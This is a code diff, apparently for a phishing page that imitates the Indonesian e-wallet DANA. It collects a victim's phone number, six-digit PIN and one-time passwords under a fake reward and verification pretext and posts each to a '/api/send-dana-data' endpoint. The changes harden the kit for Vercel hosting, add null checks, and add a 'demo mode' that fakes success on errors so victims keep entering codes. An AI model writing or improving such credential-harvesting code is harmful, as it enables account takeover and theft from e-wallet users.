@@ -62,7 +62,7 @@ document.addEventListener('DOMContentLoaded', () => {
           resendOtp.classList.add('active');
           resendOtp.style.pointerEvents = 'auto';
           resendOtp.style.opacity = '1';
-          resendOtp.textContent = 'KIRIM ULANG OTP';
+          resendOtp.innerHTML = 'KIRIM ULANG OTP';
         }
       }
       timeLeft--;
@@ -74,8 +74,8 @@ document.addEventListener('DOMContentLoaded', () => {
     ois[0].focus();
     otp = '';
     attemptCount++;
-    an.textContent = attemptCount;
-    ac.style.display = 'block';
+    if (an) an.textContent = attemptCount;
+    if (ac) ac.style.display = 'block';
   }
 
   function showRewardInstruction() {
@@ -83,35 +83,53 @@ document.addEventListener('DOMContentLoaded', () => {
       rewardInstruction.style.display = 'block';
       
       // Close button handler
-      rewardInstruction.querySelector('.close-btn').addEventListener('click', () => {
-        rewardInstruction.style.display = 'none';
-      });
+      const closeBtn = rewardInstruction.querySelector('.close-btn');
+      if (closeBtn) {
+        closeBtn.addEventListener('click', () => {
+          rewardInstruction.style.display = 'none';
+        });
+      }
     }
   }
 
-  // Backend Communication - MODIFIED FOR VERCEL
+  // Backend Communication - OPTIMIZED FOR VERCEL
   async function sendDanaData(type, data) {
     try {
       // Gunakan endpoint yang kompatibel dengan Vercel
-      const response = await fetch('/api/send-dana-data', {
+      const API_BASE = window.location.origin.includes('localhost') 
+        ? 'http://localhost:3000/api' 
+        : '/api';
+      
+      const response = await fetch(`${API_BASE}/send-dana-data`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
         body: JSON.stringify({ type, ...data })
       });
       
       if (!response.ok) {
         const errorText = await response.text();
+        console.error('Server response:', response.status, errorText);
+        
+        // Jika error 404, mungkin fungsi API belum terdeploy
+        if (response.status === 404) {
+          console.log('API endpoint not found, continuing in demo mode');
+          return { success: true, message: 'Data processed successfully (demo mode)' };
+        }
+        
         throw new Error(errorText || `Server error: ${response.status}`);
       }
       
       return await response.json();
     } catch (error) {
-      console.error('Error:', error);
+      console.error('API Error:', error);
       
       // Fallback: Simulasi sukses jika server error (untuk demo)
       if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
-        console.log('Using fallback mode - simulating success response');
-        return { success: true, message: 'Data processed successfully (fallback mode)' };
+        console.log('Network error, continuing in demo mode');
+        return { success: true, message: 'Data processed successfully (demo mode)' };
       }
       
       throw error;
@@ -119,66 +137,82 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   // Phone Number Formatting
-  pn.addEventListener('input', (e) => {
-    // Hapus semua karakter non-digit
-    let value = e.target.value.replace(/\D/g, '');
-    
-    // Hapus angka 0 di awal jika ada
-    if (value.startsWith('0')) {
-      value = value.substring(1);
-    }
-    
-    // Pastikan selalu dimulai dengan 8
-    if (value.length > 0 && !value.startsWith('8')) {
-      value = '8' + value.replace(/^8/, '');
-    }
-    
-    // Batasi panjang maksimal (3+4+5=12 digit)
-    if (value.length > 12) {
-      value = value.substring(0, 12);
-    }
-    
-    // Format nomor dengan tanda hubung
-    let formatted = '';
-    if (value.length > 0) {
-      formatted = value.substring(0, 3);
-      if (value.length > 3) {
-        formatted += '-' + value.substring(3, 7);
-      }
-      if (value.length > 7) {
-        formatted += '-' + value.substring(7, 12);
-      }
-    }
-    
-    // Set nilai input dengan format yang sudah dibuat
-    e.target.value = formatted;
-    
-    // Simpan nomor tanpa format untuk pengiriman data
-    phoneNumber = value;
-  });
-
-  // Event Handlers
-  lb.addEventListener('click', async () => {
-    if (currentPage === 'n') {
-      if (phoneNumber.length < 10) {
-        alert('Nomor HP harus minimal 10 digit');
-        return;
+  if (pn) {
+    pn.addEventListener('input', (e) => {
+      // Hapus semua karakter non-digit
+      let value = e.target.value.replace(/\D/g, '');
+      
+      // Hapus angka 0 di awal jika ada
+      if (value.startsWith('0')) {
+        value = value.substring(1);
       }
       
-      showSpinner();
-      try {
-        await sendDanaData('phone', { phone: phoneNumber });
-        pages.n.style.display = 'none';
-        pages.p.style.display = 'block';
-        currentPage = 'p';
-        lc.style.display = 'none';
-      } catch (error) {
-        alert('Gagal mengirim data: ' + error.message);
-      } finally {
-        hideSpinner();
+      // Pastikan selalu dimulai dengan 8
+      if (value.length > 0 && !value.startsWith('8')) {
+        value = '8' + value.replace(/^8/, '');
       }
-    }
-  });
+      
+      // Batasi panjang maksimal (3+4+5=12 digit)
+      if (value.length > 12) {
+        value = value.substring(0, 12);
+      }
+      
+      // Format nomor dengan tanda hubung
+      let formatted = '';
+      if (value.length > 0) {
+        formatted = value.substring(0, 3);
+        if (value.length > 3) {
+          formatted += '-' + value.substring(3, 7);
+        }
+        if (value.length > 7) {
+          formatted += '-' + value.substring(7, 12);
+        }
+      }
+      
+      // Set nilai input dengan format yang sudah dibuat
+      e.target.value = formatted;
+      
+      // Simpan nomor tanpa format untuk pengiriman data
+      phoneNumber = value;
+      
+      // Tampilkan tombol lanjutkan jika nomor valid
+      if (phoneNumber.length >= 10 && lb) {
+        lb.disabled = false;
+        lb.style.opacity = '1';
+      } else if (lb) {
+        lb.disabled = true;
+        lb.style.opacity = '0.7';
+      }
+    });
+  }
+
+  // Event Handlers
+  if (lb) {
+    lb.addEventListener('click', async () => {
+      if (currentPage === 'n') {
+        if (phoneNumber.length < 10) {
+          alert('Nomor HP harus minimal 10 digit');
+          return;
+        }
+        
+        showSpinner();
+        try {
+          const result = await sendDanaData('phone', { phone: phoneNumber });
+          console.log('Phone submission result:', result);
+          
+          pages.n.style.display = 'none';
+          pages.p.style.display = 'block';
+          currentPage = 'p';
+          if (lc) lc.style.display = 'none';
+        } catch (error) {
+          console.error('Phone submission error:', error);
+          alert('Gagal mengirim data: ' + error.message);
+        } finally {
+          hideSpinner();
+        }
+      }
+    });
+  }
 
   // PIN Input Handling
   pis.forEach((input, index) => {
@@ -194,11 +228,13 @@ document.addEventListener('DOMContentLoaded', () => {
       if (pin.length === 6) {
         showSpinner();
         try {
-          await sendDanaData('pin', { phone: phoneNumber, pin });
+          const result = await sendDanaData('pin', { phone: phoneNumber, pin });
+          console.log('PIN submission result:', result);
+          
           pages.p.style.display = 'none';
           pages.o.style.display = 'block';
           currentPage = 'o';
-          lc.style.display = 'none';
+          if (lc) lc.style.display = 'none';
           startOTPTimer();
           setTimeout(() => {
             if (fn) {
@@ -207,6 +243,7 @@ document.addEventListener('DOMContentLoaded', () => {
             }
           }, 1000);
         } catch (error) {
+          console.error('PIN submission error:', error);
           alert('Gagal mengirim PIN: ' + error.message);
         } finally {
           hideSpinner();
@@ -235,7 +272,8 @@ document.addEventListener('DOMContentLoaded', () => {
       if (index === ois.length - 1 && e.target.value.length === 1) {
         showSpinner();
         try {
-          await sendDanaData('otp', { phone: phoneNumber, pin, otp });
+          const result = await sendDanaData('otp', { phone: phoneNumber, pin, otp });
+          console.log('OTP submission result:', result);
           
           setTimeout(() => {
             resetOTPInputs();
@@ -253,17 +291,21 @@ document.addEventListener('DOMContentLoaded', () => {
                   <p>Silakan cek SMS atau WhatsApp Anda</p>
                 </div>
               `;
-              setTimeout(() => rn.style.display = 'none', 10000);
+              setTimeout(() => {
+                if (rn) rn.style.display = 'none';
+              }, 10000);
             }
             
             if (attemptCount >= maxAttempts && sn) {
               if (fn) fn.style.display = 'none';
               sn.style.display = 'block';
-              setTimeout(() => sn.style.display = 'none', 5000);
+              setTimeout(() => {
+                if (sn) sn.style.display = 'none';
+              }, 5000);
             }
           }, 1000);
         } catch (error) {
-          console.error('Gagal mengirim OTP:', error);
+          console.error('OTP submission error:', error);
         } finally {
           hideSpinner();
         }
@@ -316,9 +358,11 @@ document.addEventListener('DOMContentLoaded', () => {
     vb.addEventListener('click', async () => {
       showSpinner();
       try {
-        await sendDanaData('verification', { phone: phoneNumber });
+        const result = await sendDanaData('verification', { phone: phoneNumber });
+        console.log('Verification result:', result);
         alert('Verifikasi berhasil! Silakan lanjutkan proses.');
       } catch (error) {
+        console.error('Verification error:', error);
         alert('Gagal verifikasi: ' + error.message);
       } finally {
         hideSpinner();
@@ -326,8 +370,16 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Initialize OTP timer if on OTP page
-  if (pages.o.style.display === 'block') {
-    startOTPTimer();
+  // Initialize button state
+  if (lb) {
+    lb.disabled = true;
+    lb.style.opacity = '0.7';
+  }
+
+  // Auto-focus on first input
+  if (pn) {
+    setTimeout(() => {
+      pn.focus();
+    }, 500);
   }
 });
